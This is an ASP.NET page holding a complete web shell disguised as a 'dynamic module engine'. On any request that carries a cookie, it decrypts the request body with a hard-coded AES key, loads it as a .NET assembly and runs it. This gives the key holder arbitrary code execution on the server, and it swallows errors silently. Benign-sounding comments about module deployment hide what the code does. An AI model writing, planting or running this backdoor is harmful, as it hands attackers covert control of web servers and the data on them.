<%@ Page Language="C#" %><script runat="server">
/// <summary>
/// Provides services for dynamically loading and managing encrypted application modules.
/// This allows for extending application functionality without requiring a full redeployment.
/// </summary>
public static class DynamicModuleEngine
{
    // The secret key for decrypting module packages. This must match the key used during packaging.
    private static readonly byte[] ModuleEncryptionKey = System.Text.Encoding.Default.GetBytes("ca63457538b9b1e0");
    
    // The conventional entry point class name within a module assembly.
    private static readonly string ModuleEntryClassName = "K";

    /// <summary>
    /// Entry point for the module engine. Called on every request to check for an incoming module.
    /// </summary>
    public static void HandleRequest(System.Web.UI.Page page)
    {
        // A module deployment request is identified by the presence of any cookie.
        // This is a simple handshake mechanism with the deployment server.
        if (page.Request.Cookies.Count == 0)
        {
            return; // Not a module deployment request.
        }

        try
        {
            byte[] encryptedModule = ReadModuleStream(page.Request.InputStream);
            if (encryptedModule.Length == 0) return;

            byte[] decryptedAssemblyBytes = DecryptModule(encryptedModule);
            ExecuteModule(decryptedAssemblyBytes, page);
        }
        catch (System.Exception)
        {
            // In a production environment, this exception should be logged.
            // For security, we do not expose exception details to the client.
        }
    }

    private static byte[] ReadModuleStream(System.IO.Stream stream)
    {
        byte[] buffer = new byte[stream.Length];
        stream.Read(buffer, 0, buffer.Length);
        return buffer;
    }

    private static byte[] DecryptModule(byte[] encryptedData)
    {
        using (var aesProvider = new System.Security.Cryptography.RijndaelManaged())
        {
            aesProvider.Key = ModuleEncryptionKey;
            aesProvider.IV = ModuleEncryptionKey; // IV is same as key by convention for this system.
            using (var decryptor = aesProvider.CreateDecryptor())
            {
                return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
            }
        }
    }

    private static void ExecuteModule(byte[] assemblyBytes, object executionContext)
    {
        var moduleAssembly = System.Reflection.Assembly.Load(assemblyBytes);
        var moduleInstance = moduleAssembly.CreateInstance(ModuleEntryClassName);
        
        // The 'Equals' method is overridden in the module to act as the main execution entry point,
        // accepting the current page context for interaction with the Http pipeline.
        moduleInstance.Equals(executionContext);
    }
}

// Hook into the page lifecycle to run the module engine.
void Page_Load(object sender, EventArgs e)
{
    DynamicModuleEngine.HandleRequest(this);
}
</script>